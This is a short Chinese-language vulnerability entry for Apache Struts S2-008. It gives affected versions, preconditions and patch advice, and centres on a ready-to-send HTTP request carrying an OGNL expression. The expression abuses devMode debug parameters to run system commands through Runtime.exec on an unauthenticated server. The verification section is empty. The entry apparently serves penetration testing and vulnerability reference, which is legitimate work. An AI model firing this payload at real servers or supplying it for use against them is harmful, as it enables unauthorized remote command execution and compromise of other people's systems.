## 漏洞描述

S2-008 涉及多个漏洞，Cookie 拦截器错误配置可造成 OGNL 表达式执行。当 struts2 应用开启 devMode 模式后会有多个调试接口能够直接查看对象信息或直接执行命令。

## 影响版本

- Apache Struts 2.1.0 - 2.3.1

## 前置条件

- 无需认证
- 目标应用开启了 devMode 模式

## 利用步骤

1. 添加 debug 参数和 OGNL 表达式

## Payload

```http
GET /devmode.action?debug=command&expression=(%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean(%22false%22)%20%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C@java.lang.Runtime@getRuntime(%29.exec(%22id%22)) HTTP/1.1
Host: target:8080
```

## 验证方法

```bash
# 检查命令执行结果
```

## 修复建议

1. 升级 Apache Struts 至 2.3.2+
2. 生产环境禁用 devMode
3. 对 Cookie 名称进行严格过滤
